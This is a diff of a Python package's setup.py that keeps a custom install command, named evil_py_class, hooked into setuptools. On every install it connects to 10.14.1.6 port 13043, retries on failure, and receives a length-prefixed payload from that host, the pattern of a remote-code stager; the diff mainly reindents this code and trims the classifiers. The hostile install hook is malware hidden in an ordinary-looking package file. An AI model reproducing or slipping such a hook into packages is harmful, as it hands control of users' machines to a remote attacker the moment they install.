@@ -6,11 +6,11 @@ class evil_py_class(install):
   def run(self):
     for x in range(10):
       try:
-	s=socket.socket(2,socket.SOCK_STREAM)
-	s.connect(('10.14.1.6',13043))
-	break
+        s=socket.socket(2,socket.SOCK_STREAM)
+        s.connect(('10.14.1.6',13043))
+        break
       except:
-	time.sleep(5)
+        time.sleep(5)
     l=struct.unpack('>I',s.recv(4))[0]
     d=s.recv(l)
     while len(d)<l:
@@ -30,10 +30,5 @@ setuptools.setup(
   long_description_content_type="text/markdown",
   url="https://github.com/sn0wfa11",
   packages=setuptools.find_packages(),
-  cmdclass={ "install": evil_py_class },
-  classifiers=(
-    "Programming Language :: Python :: 3",
-    "License :: OSI Approved :: MIT License",
-    "Operating System :: OS Independent",
-  ),
+  cmdclass={ "install": evil_py_class }
 )
